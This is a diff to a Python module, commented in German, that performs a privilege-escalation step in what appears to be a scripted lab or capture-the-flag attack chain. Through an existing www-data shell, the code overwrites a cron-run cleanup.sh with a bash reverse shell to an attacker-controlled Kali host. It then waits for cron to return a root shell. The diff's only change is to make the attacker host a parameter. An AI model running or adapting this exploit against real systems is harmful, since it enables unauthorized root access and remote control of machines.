@@ -19,12 +19,14 @@ def send_command(shell, command):
     time.sleep(0.5)
 
 
-def run(www_shell):
+def run(www_shell, kali_host=KALI_HOST):
     """
     Führt Privilege Escalation durch.
 
     Eingabe:  www_shell (socket) — Bash-Verbindung als www-data
               vom vorherigen Schritt übergeben
+              kali_host (str)   — IP/Hostname der Kali-Maschine für den
+              Reverse-Shell-Payload (überschreibt das Modul-Default)
     Ausgabe:  root_shell (socket) — Bash-Verbindung als root
               wird an nächsten Schritt weitergegeben
     """
@@ -43,7 +45,7 @@ def run(www_shell):
         # > überschreibt, >> hängt an
         print("[*] Überschreibe cleanup.sh...")
         send_command(www_shell, f"echo '#!/bin/bash' > {CLEANUP_SCRIPT}")
-        send_command(www_shell, f"echo 'bash -i >& /dev/tcp/{KALI_HOST}/{PORT_ROOT} 0>&1' >> {CLEANUP_SCRIPT}")
+        send_command(www_shell, f"echo 'bash -i >& /dev/tcp/{kali_host}/{PORT_ROOT} 0>&1' >> {CLEANUP_SCRIPT}")
         print("[+] cleanup.sh erfolgreich überschrieben")
         print("[*] Warte auf Cron-Job (max. 60 Sekunden)...")
 
